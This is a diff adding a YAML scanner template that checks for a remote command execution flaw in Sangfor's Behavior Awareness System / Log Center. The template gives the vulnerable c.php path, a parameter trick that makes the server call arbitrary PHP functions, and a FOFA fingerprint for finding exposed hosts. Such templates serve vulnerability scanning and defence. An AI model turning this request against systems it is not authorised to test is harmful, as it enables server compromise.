@@ -1,0 +1,25 @@
+id: sangfor-logcent-rce
+
+info:
+  name: 深信服行为感知系统/日志中心 c.php 远程命令执行
+  author: daffainfo
+  severity: critical
+  verified: true
+  description: |
+    深信服行为感知系统BA（Behavior Awareness System），是深信服上网行为管理的又一大颠覆式创新，它基于上网行为管理的海量上网日志，对用户行为特征进行深度建模分析，不断推出不同场景的行为感知应用，持续挖掘数据价值，帮助组织洞悉行为风险，简化运维管理。深信服行为感知系统/日志中心系统存在远程命令执行漏洞，攻击者通过漏洞可以上传木马文件，导致服务器失陷。
+    fofa: body="isHighPerformance : !!SFIsHighPerformance,"
+  reference:
+    - https://mp.weixin.qq.com/s/t5DF-O5uW1Fgnc9kkAlPiQ
+  tags: sangfor,logcent,rce
+  created: 2023/05/26
+
+set:
+  randstr: randomLowercase(10)
+  md5: md5(randstr)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /tool/log/c.php?strip_slashes=md5&host={{randstr}}
+    expression: response.status == 200 && response.body.bcontains(bytes(md5))
+expression: r0()
